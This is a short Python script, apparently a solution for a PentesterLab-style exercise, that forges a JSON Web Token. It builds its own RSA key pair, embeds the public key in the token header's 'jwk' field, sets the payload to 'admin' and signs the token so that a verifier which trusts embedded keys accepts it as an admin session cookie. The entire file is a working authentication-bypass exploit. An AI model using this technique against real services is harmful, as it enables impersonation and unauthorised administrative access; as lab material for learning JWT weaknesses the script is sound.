#!/bin/python3

from Crypto.Util.number import long_to_bytes
from Crypto.Hash import SHA256
from Crypto.Signature import PKCS1_v1_5
from Crypto.PublicKey import RSA
import base64
import json

def int_to_bytes(x: int) -> bytes:
    return x.to_bytes((x.bit_length() + 7) // 8, 'big')

def int_from_bytes(xbytes: bytes) -> int:
    return int.from_bytes(xbytes, 'big')


jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjpudWxsfQ.Tr0VvdP6rVBGBGuI_luxGCOaz6BbhC6IxRTlKOW8UjM"
header, data, signature = jwt.split('.')


# openssl genrsa -out private.pem 2048
priv = RSA.importKey(open("private.pem", "rb").read())
pub = priv.publickey()



e = int_to_bytes(pub.e)
e = base64.urlsafe_b64encode(e).rstrip(b'=').decode('utf-8')

# NOTE: struct works for smaller ints, but not larger ones
# import struct
# n = struct.pack("<I", pub.n)
n = int_to_bytes(pub.n)
n = base64.urlsafe_b64encode(n).rstrip(b'=').decode('utf-8')


header = {"alg": "RS256", "jwk": {"kty": "RSA", "kid" : "pentesterla",
                                    "use": "sig", "n": n, "e": e }}

header = base64.urlsafe_b64encode(json.dumps(header).encode('gbk')).rstrip(b'=')

# NOTE: -------
# string literal previx
# r''  is  //  regex in python
# ---------

# import re
# re.sub('=+$', '', str)
payload = base64.urlsafe_b64encode(b"admin").rstrip(b'=')

token = header+b'.'+payload

# sign
digest = SHA256.new()
digest.update(token)

signer = PKCS1_v1_5.new(priv)

signature = signer.sign(digest)
signature = base64.urlsafe_b64encode(signature).rstrip(b'=')

cookie = token+b'.'+signature
print(cookie.decode())
